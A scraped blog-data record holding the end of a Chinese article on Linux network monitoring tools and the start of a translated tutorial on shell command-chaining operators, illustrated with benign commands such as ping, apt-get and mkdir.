href=\"http://jbcdn2.b0.upaiyun.com/2017/12/cd3080fed79dc64b9b4e698d0316dc7a.jpg\"><img class=\"aligncenter size-full wp-image-113375\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/cd3080fed79dc64b9b4e698d0316dc7a.jpg\" alt=\"180516yvm7wevqenuxebnu\"></a></p>\n<p style=\"text-align: center\"><em>ibmonitor tool for linux</em></p>\n<p>与上面的类似，它显示连接接口上过滤后的网络流量，并且，明确地将接收流量和发送流量区分开。</p>\n<p>我们可以从 <a href=\"http://ibmonitor.sourceforge.net/\">这个链接</a> 获取这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_8\">Htop – Linux 进程跟踪</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/0e1a55542e556c9e11f2d16d59601154.png\"><img class=\"aligncenter size-full wp-image-113376\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/0e1a55542e556c9e11f2d16d59601154.png\" alt=\"180517ddgb0xr4gr69dnbt\"></a></p>\n<p style=\"text-align: center\"><em>htop linux processes monitoring tool</em></p>\n<p>Htop 是一个更先进的、交互式的、实时的 Linux 进程跟踪工具。它类似于 Linux 的 top 命令，但是有一些更高级的特性，比如，一个更易于使用的进程管理界面、快捷键、水平和垂直的进程视图等更多特性。Htop 是一个第三方工具，它不包含在 Linux 系统中，你必须使用 <strong>YUM</strong> 或者 <strong>APT-GET</strong> 或者其它的包管理工具去安装它。关于安装它的更多信息，读<a href=\"http://wesharethis.com/knowledgebase/htop-and-atop/\">这篇文章</a>。</p>\n<p>我们可以从 <a href=\"http://hisham.hm/htop/\">这个链接</a> 获取这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_9\">arpwatch – 以太网活动监视器</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/58bead3d8a40a0d640c3c5e93ef9a959.png\"><img class=\"aligncenter size-full wp-image-113379\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/58bead3d8a40a0d640c3c5e93ef9a959.png\" alt=\"180517ddgb0xr4gr69dnbt\"></a></p>\n<p style=\"text-align: center\"><em>arpwatch ethernet monitoring tool</em></p>\n<p>arpwatch 是一个设计用于在 Linux 网络中去管理以太网通讯的地址解析程序。它持续监视以太网通讯并记录一个网络中的 IP 地址和 MAC 地址的变化，该变化同时也会记录一个时间戳。它也有一个功能是当一对 IP 和 MAC 地址被添加或者发生变化时，发送一封邮件给系统管理员。在一个网络中发生 ARP 攻击时，这个功能非常有用。</p>\n<p>我们可以从 <a href=\"http://linux.softpedia.com/get/System/Monitoring/arpwatch-NG-7612.shtml\">这个链接</a> 获取这个工具的更多信息以及下载必要的包。</p>\n<h1 id=\"toc_10\">Wireshark – 网络监视工具</h1>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2017/12/3eeac5779e89f77d55ef32a89c2f174c.jpg\"><img class=\"aligncenter size-full wp-image-113380\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/3eeac5779e89f77d55ef32a89c2f174c.jpg\" alt=\"180520x8b9tis5rsyhh89w\"></a></p>\n<p style=\"text-align: center\"><em>wireshark network monitoring tool</em></p>\n<p><a href=\"https://www.wireshark.org/\">Wireshark</a> 是一个自由的应用程序，它允许你去捕获和查看前往你的系统和从你的系统中返回的信息，它可以去深入到数据包中并查看每个包的内容 —— 以分别满足你的不同需求。它一般用于去研究协议问题和去创建和测试程序的特别情况。这个开源分析器是一个被公认的分析器商业标准，它的流行要归功于其久负盛名。</p>\n<p>最初它被叫做 Ethereal，Wireshark 有轻量化的、易于理解的界面，它能分类显示来自不同的真实系统上的协议信息。</p>\n<h1 id=\"toc_11\">结论</h1>\n<p>在这篇文章中，我们看了几个开源的网络监视工具。虽然我们从这些工具中挑选出来的认为是“最佳的”，并不意味着它们都是最适合你的需要的。例如，现在有很多的开源监视工具，比如，OpenNMS、Cacti、和 Zennos，并且，你需要去从你的个体情况考虑它们的每个工具的优势。</p>\n<p>另外，还有不同的、更适合你的需要的不开源的工具。</p>\n<p>你知道的或者使用的在 Linux 终端中的更多网络监视工具还有哪些？</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113367\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113367votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113367\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 5 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "2"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/12/a358ba4f51dd7f1dac9b1dfc1fef5343.png"], "title": "Linux 中命令链接操作符的十个最佳实例", "fav_nums": 3, "url": "http://blog.jobbole.com/113305/", "create_date": "2017/12/12", "url_object_id": "bccf70a0f17c9ad3021262b849ba61ac", "comment_nums": 2, "front_image_path": "full/bbf5b2d33074c754cd78cbcc77e858e9cd022815.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.tecmint.com/chaining-operators-in-linux-with-practical-examples/\">Tecmint</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-2469-1.html\">Linux中国/geekpi</a>   </div><p>Linux命令中的链接的意思是，通过操作符的行为将几个命令组合执行。Linux中的链接命令，有些像你在shell中写<a href=\"http://www.tecmint.com/category/bash-shell/\" target=\"_blank\" rel=\"external nofollow\">短小的shell脚本</a>，并直接在终端中执行。链接使得自动处理变得更方便。不仅如此，一个无人看管的机器在链接操作符的帮助下能够十分有条理地运行。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2017/12/a358ba4f51dd7f1dac9b1dfc1fef5343.png\" alt=\"\" width=\"256\" height=\"256\"></p>\n<p style=\"text-align: center\"><em>Linux中的10个链接操作符</em></p>\n<p>本文旨在介绍一些常用的<strong>链接操作符</strong>，通过简短的描述和相关的例子帮助读者提高生产力、降低系统负载、写出更加简短有意义的代码。</p>\n<h3>1. 和号操作符 (&amp;)</h3>\n<p>‘<strong>&amp;</strong>’的作用是使命令在后台运行。只要在命令后面跟上一个空格和 ‘<strong>&amp;</strong>’。你可以一口气在后台运行多个命令。</p>\n<p>在后台运行一个命令:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b15c505098286\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntecmint@localhost:~$ ping ­c5 www.tecmint.com &amp;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b15c505098286-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b15c505098286-1\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ping</span><span class=\"crayon-h\"> </span>­<span class=\"crayon-e\">c5 </span><span class=\"crayon-v\">www</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>同时在后台运行两个命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b167019337539\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@localhost:/home/tecmint# apt-get update &amp; mkdit test &amp;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b167019337539-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b167019337539-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-p\"># apt-get update &amp; mkdit test &amp;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3>2. 分号操作符 (;)</h3>\n<p>分号操作符使你可以一口气运行几个命令，命令顺序执行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b16b711973124\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@localhost:/home/tecmint# apt-get update ; apt-get upgrade ; mkdir test</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b16b711973124-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b16b711973124-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-p\"># apt-get update ; apt-get upgrade ; mkdir test</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>上述命令先后执行了update和upgrade，最后在当前工作目录下创建了一个‘<strong>test</strong>’文件夹</p>\n<h3>3. 与操作符 (&amp;&amp;)</h3>\n<p>如果第一个命令执行成功，<strong>与操作符 (&amp;&amp;)</strong>才会执行第二个命令，也就是说，第一个命令退出状态是<strong>0</strong>。（译注：原文的这里明显写错了，我们进行了改译，有兴趣的读者可以参看原文以及原文下面的评论。在UNIX里面，0表示无错误，而所有非0返回值都是各种错误）。这个命令在检查最后一个命令的执行状态时很有用。</p>\n<p>比如，我想使用<strong><a href=\"http://www.tecmint.com/command-line-web-browsers/\" target=\"_blank\" rel=\"external nofollow\">links 命令</a></strong>在终端中访问网站<strong>tecmint.com</strong>，但在这之前我需要检查主机是否<strong>在线</strong>或<strong>不在线</strong>。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b16f777530576\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@localhost:/home/tecmint# ping -c3 www.tecmint.com &amp;&amp; links www.tecmint.com</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b16f777530576-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b16f777530576-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">home</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-p\"># ping -c3 www.tecmint.com &amp;&amp; links www.tecmint.com</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3>4. 或操作符 (||)</h3>\n<p><strong>或操作符 (||)</strong>很像编程中的<strong>else</strong>语句。上面的操作符允许你在第一个命令失败的情况下执行第二个命令，比如，第一个命令的退出状态是<strong>1</strong>。</p>\n<p>举例来说，我想要在非root帐户中执行‘<strong>apt-get update</strong>‘，如果第一个命令失败了，接着会执行第二个命令‘<strong>links <a href=\"http://www.tecmint.com\" target=\"_blank\" rel=\"external nofollow\">www.tecmint.com</a></strong>‘。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b173770454845\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntecmint@localhost:~$ apt-get update || links tecmint.com</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b173770454845-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b173770454845-1\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-v\">update</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">links </span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>上面的命令中，由于该<strong>用户</strong>不允许<strong>更新</strong>系统，这意味着第一个命令的退出状态是’<strong>1</strong>′,因此最后一个命令‘<strong>links tecmint.com</strong>‘会执行。</p>\n<p>如果第一个命令成功执行并且退出状态是‘<strong>0</strong>‘呢？很明显的，第二个命令不会执行。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b176460179018\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntecmint@localhost:~$ mkdir test || links tecmint.com</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4b8b176460179018-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4b8b176460179018-1\"><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">localhost</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">~</span><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">mkdir </span><span class=\"crayon-v\">test</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">||</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">links </span><span class=\"crayon-v\">tecmint</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>这里，用户在家目录创建了一个‘<strong>test</strong>‘文件夹，这是被允许的。命令成功的执行，退出状态是‘<strong>0</strong>‘,因此，最后的命令不会执行。</p>\n<h3>5. 非操作符 (!)</h3>\n<p><strong>非操作符 (!)</strong>很像<strong>except</strong>语句。这个命令会执行除了提供的条件外的所有的语句。要理解这点，在你的主目录创建一个目录‘<strong>tecmint</strong>’，并‘<strong>cd</strong>’到它这里。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4b8b179852180670\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" 